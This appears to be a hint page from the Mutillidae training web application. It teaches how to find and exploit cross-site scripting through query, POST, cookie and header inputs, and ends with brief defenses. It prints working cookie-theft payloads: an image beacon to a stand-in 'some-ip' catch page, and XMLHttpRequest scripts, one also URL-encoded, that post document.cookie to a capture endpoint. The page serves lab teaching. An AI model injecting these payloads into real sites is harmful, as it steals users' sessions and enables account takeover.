			<br/><br/>
			<span class="report-header">Overview</span>
			<br/><br/>
			Cross-site scripting and HTML injection may occcur
			when user or attacker controlled input is later incorporated 
			without being encoded into the web server response. In other words, the attacker
			can send input which later is incorporated into the web page the user receives.
			<br/><br/>
			<span class="report-header">Discovery Methodology</span>
			<br/><br/>
			Inject all available parameters of the web page with a searchable string
			such as the word "CANARY" along with characters generally useful in 
			writing HTML, JavaScript or other code. Search the response carefully
			noting any location where the test string appears unencoded. These 
			locations may allow cross-site scripting. See 
			<a href="http://ha.ckers.org/xss.html">Rsnake\'s XSS Cheet Sheet</a>
			for more ways you can encode XSS attacks that may 
			allow bypassing some filters.
			<br/><br/>
			Hint: An example injection might be &lt;CANARY={}&quot;&quot;()&#39;&#39;;#$--/&gt;1.
			Adding a sequencial integer to the test input can help determine which of the 
			inputs parameters resulted in the response string found.
			<br/><br/>
			<span class="report-header">Exploitation</span>
			<br/><br/>
			Determine the prefix and suffix needed to make the injected code "fit" syntatically
			then add a payload between. Inject the exploit.
			<br/><br/>
			Classic example: 
<br/>
<code>
&lt;script&gt;alert("XSS");&lt;/script&gt;
</code>
			<br/>
			Attempt to steal cookies:
			<br/>
<code>
&lt;script&gt;
	new Image().src="http://some-ip/mutillidae/catch.php?cookie="+encodeURI(document.cookie);
&lt;/script&gt;
</code>
			<br/>
			Some pages are easier to exploit because the page reflects any input. This input
			could be from the Cookies, and URL query parameter, or any POSTed parameter. 
			This may be seen in the view source as a comment in which the developer
			dumps the referer string for diagnostic purpouses (and therefore dumps
			the query parameters as well). When a random parameter is created and injected,
			this is known as a parameter addition attack.  
			<br/><br/>
			<span class="report-header">Cross Site Scripting Via URL query parameters</span>
			<br/><br/>
			Note any URL query parameters and inject a script into each.
			<br/><br/>
			<span class="report-header">Cross Site Scripting Via POST parameters</span>
			<br/><br/>
			Use Burp-Suite to note POST parameters and inject a script into each.
			<br/><br/>
			<span class="report-header">Cross Site Scripting Via Cookie</span>
			<br/><br/>
			Use Cookie Manager or Burp-Suite to create a cross site script and inject a script into each cookie. 
			If the page prints the value of the cookie to the screen, the script 
			will execute.
			<br/><br/>
			<span class="report-header">Cross Site Scripting Via HTTP Headers</span>
			<br/><br/>
			Any time dynamic output is displayed by the browser, think "Cross-Site Scripting". 
			Work backwards from that output to see if there is a way to influence 
			what is output. This could be as simple as entering "123" in the first field, 
			"456" in the second field, and so on. Repeat this for all input including HTTP 
			Headers, Cookie values, Hidden Fields etc. If those inputs show up anywhere in the output 
			investigate further. Dont look for visible output. That will miss most of the output. 
			Search the entire response stream including all the HTTP Headers. If you find 
			your test strings, send in more useful characters such as "&lt;". 
			Some developers sanitize input which may later be output. 
			Others encode (escape) the input. These are nice tries but can result in
			"FAIL" because the data could be changed after it is input encoded by
			someone with access to the database, a database corrupting script, or 
			any attempts to filter/sanitize can be flawed/bypassed.
			<br/><br/>
			Any time the application uses the HTTP headers there are multiple 
			possibilities. If the HTTP header is output into the page, think XSS.
			But with HTTP Headers, also consider 
			HTTP Response Splitting. HTTP Headers are delimited (separated) by line-breaks. 
			Check out the RFC on HTTP to see the specification. 
			When an application included some type of input
			as output into the HTTP Header, it may be possible to inject a line-break.
			If this is possible, then an actor could also inject a new HTTP Header of 
			there choosing. These two situations are counterparts. XSS via HTTP Headers 
			may occur when HTTP Request Headers are output into the HTTP Response. 
			HTTP Response Splitting may occur when user/database input is output into 
			HTTP Headers.
			<br/><br/>
			Try Tamper Data to get control of all the HTTP headers in the request. 
			You can start by changing the user-agent to see your input displayed here.
			<br/><br/>
			<span class="report-header">Example (For Samurai WTF)</span>
			<br/><br/>
			<textarea cols="80" rows="20">
			&lt;script&gt;
				var lXMLHTTP;
				try{ 
					var lData = &quot;data=&quot; + encodeURIComponent(document.cookie);
					var lHost = &quot;mutillidae&quot;;
					var lProtocol = &quot;http&quot;;
					var lFilePath = &quot;/capture-data.php&quot;;
					var lAction = lProtocol + &quot;://&quot; + lHost + lFilePath;
					var lMethod = &quot;POST&quot;;
			
					try {
						lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); 
					}catch (e) { 
						try { 
							lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); 
						}catch (e) { 
							try { 
								lXMLHTTP = new XMLHttpRequest(); 
							}catch (e) { 
								alert(e.message);/*For testing only*/
							} 
						} 
					}/*end try*/
			
					lXMLHTTP.onreadystatechange = function(){};
					lXMLHTTP.open(lMethod, lAction, true);
					lXMLHTTP.setRequestHeader(&quot;Host&quot;, lHost); 
					lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);			
					lXMLHTTP.send(lData);
			
				}catch(e){
					alert(e.message);/*For testing only*/
				} 
			&lt;/script&gt;
			</textarea>
			<br/><br/>
			<span class="report-header">Example (For non-Samurai WTF users)</span>
			<br/><br/>
			<textarea cols="80" rows="20">
			&lt;script&gt;
				var lXMLHTTP;
				try{ 
					var lData = &quot;data=&quot; + encodeURIComponent(document.cookie);
					var lHost = &quot;localhost&quot;;
					var lProtocol = &quot;http&quot;;
					var lFilePath = &quot;/mutillidae/capture-data.php&quot;;
					var lAction = lProtocol + &quot;://&quot; + lHost + lFilePath;
					var lMethod = &quot;POST&quot;;
			
					try {
						lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); 
					}catch (e) { 
						try { 
							lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); 
						}catch (e) { 
							try { 
								lXMLHTTP = new XMLHttpRequest(); 
							}catch (e) { 
								alert(e.message);/*For testing only*/
							} 
						} 
					}/*end try*/
			
					lXMLHTTP.onreadystatechange = function(){};
					lXMLHTTP.open(lMethod, lAction, true);
					lXMLHTTP.setRequestHeader(&quot;Host&quot;, lHost); 
					lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);			
					lXMLHTTP.send(lData);
			
				}catch(e){
					alert(e.message);/*For testing only*/
				} 
			&lt;/script&gt;
			</textarea>
			<br/><br/>
			Note that some characters which are reserved in databases are also reserved
			in web servers. If submitting injections directly via an interception proxy 
			like Burp-Suite, URL encode the injection to avoid a syntax error on the
			web server. 
			<br/><br/>
			<span class="report-header">URL Encoded version (with TAB spaces (%09) removed</span>
			<br/>
<code>
%3c%73%63%72%69%70%74%3e%0a%76%61%72%20%6c%58%4d%4c%48%54%54%50%3b%0a%74%72%79%7b%20%0a%76%61%72%20%6c%44%61%74%61%20%3d%20%22%64%61%74%61%3d%22%20%2b%20%65%6e%63%6f%64%65%55%52%49%43%6f%6d%70%6f%6e%65%6e%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3b%0a%76%61%72%20%6c%48%6f%73%74%20%3d%20%22%6c%6f%63%61%6c%68%6f%73%74%22%3b%0a%76%61%72%20%6c%50%72%6f%74%6f%63%6f%6c%20%3d%20%22%68%74%74%70%22%3b%0a%76%61%72%20%6c%46%69%6c%65%50%61%74%68%20%3d%20%22%2f%6d%75%74%69%6c%6c%69%64%61%65%2f%63%61%70%74%75%72%65%2d%64%61%74%61%2e%70%68%70%22%3b%0a%76%61%72%20%6c%41%63%74%69%6f%6e%20%3d%20%6c%50%72%6f%74%6f%63%6f%6c%20%2b%20%22%3a%2f%2f%22%20%2b%20%6c%48%6f%73%74%20%2b%20%6c%46%69%6c%65%50%61%74%68%3b%0a%76%61%72%20%6c%4d%65%74%68%6f%64%20%3d%20%22%50%4f%53%54%22%3b%0a%0a%74%72%79%20%7b%0a%6c%58%4d%4c%48%54%54%50%20%3d%20%6e%65%77%20%41%63%74%69%76%65%58%4f%62%6a%65%63%74%28%22%4d%73%78%6d%6c%32%2e%58%4d%4c%48%54%54%50%22%29%3b%20%0a%7d%63%61%74%63%68%20%28%65%29%20%7b%20%0a%74%72%79%20%7b%20%0a%6c%58%4d%4c%48%54%54%50%20%3d%20%6e%65%77%20%41%63%74%69%76%65%58%4f%62%6a%65%63%74%28%22%4d%69%63%72%6f%73%6f%66%74%2e%58%4d%4c%48%54%54%50%22%29%3b%20%0a%7d%63%61%74%63%68%20%28%65%29%20%7b%20%0a%74%72%79%20%7b%20%0a%6c%58%4d%4c%48%54%54%50%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%20%0a%7d%63%61%74%63%68%20%28%65%29%20%7b%20%0a%2f%2f%61%6c%65%72%74%28%65%2e%6d%65%73%73%61%67%65%29%3b%2f%2f%54%48%49%53%20%4c%49%4e%45%20%49%53%20%54%45%53%54%49%4e%47%20%41%4e%44%20%44%45%4d%4f%4e%53%54%52%41%54%49%4f%4e%20%4f%4e%4c%59%2e%20%44%4f%20%4e%4f%54%20%49%4e%43%4c%55%44%45%20%49%4e%20%50%45%4e%20%54%45%53%54%2e%20%0a%7d%20%0a%7d%20%0a%7d%2f%2f%65%6e%64%20%74%72%79%0a%0a%6c%58%4d%4c%48%54%54%50%2e%6f%6e%72%65%61%64%79%73%74%61%74%65%63%68%61%6e%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%7b%7d%20%0a%6c%58%4d%4c%48%54%54%50%2e%6f%70%65%6e%28%6c%4d%65%74%68%6f%64%2c%20%6c%41%63%74%69%6f%6e%2c%20%74%72%75%65%29%3b%0a%6c%58%4d%4c%48%54%54%50%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%22%48%6f%73%74%22%2c%20%6c%48%6f%73%74%29%3b%20%0a%6c%58%4d%4c%48%54%54%50%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%22%43%6f%6e%74%65%6e%74%2d%54%79%70%65%22%2c%20%22%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%22%29%3b%0a%6c%58%4d%4c%48%54%54%50%2e%73%65%6e%64%28%6c%44%61%74%61%29%3b%0a%0a%7d%63%61%74%63%68%28%65%29%7b%20%0a%7d%20%0a%3c%2f%73%63%72%69%70%74%3e%0a
</code>
			<br/><br/>
			<span class="report-header">Cross Site Scripting Defenses</span>
			<br/><br/>
			To defend against Cross-Site Scripting, encode all output per context.
			Just because the application sanitized/validated/filtered the input 
			when the user sent the input doesnt mean the application is safe. The 
			database could be altered by a rouge insider, a database attack such as 
			ASPROX, or a mallicious programmer. Developers should not have access to 
			production database data; ever. Developers should not be able to copy 
			their own code into production; ever. That is what change control is for.
			<br/><br/>
			<span class="report-header">Videos</span>
			<br/><br/>
			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->ExplanationofHTTPOnlyCookiesinPresenceCrossSiteScripting);?>
			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->TwoMethodstoStealSessionTokenusingCrossSiteScripting);?>
			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->InjectingaCrossSiteScriptviaCascadingStylesheetContext);?>
			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->BasicsofInjectingCrossSiteScriptintoHTMLonclickEvent);?>
			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->IntroductiontolocatingReflectedCrosssiteScripting);?>
			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->SendingPersistentCrosssiteScriptsintoWebLogstoSnagWebAdmin);?>
			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->GenerateCrossSiteScriptswithSQLInjection);?>
			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->InjectingCrossSiteScriptsXSSintoLogPageviaCookie);?>
			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->IntroductiontoHTMLInjectionHTMLiandCrossSiteScriptingXSSUsingMutillidae);?>
			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->IntroductiontoCrossSiteScriptingXSSviaJavaScriptStringInjection);?>
			<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->ExplanationofHTTPOnlyCookiesinPresenceCrossSiteScripting);?>
			<br/><br/>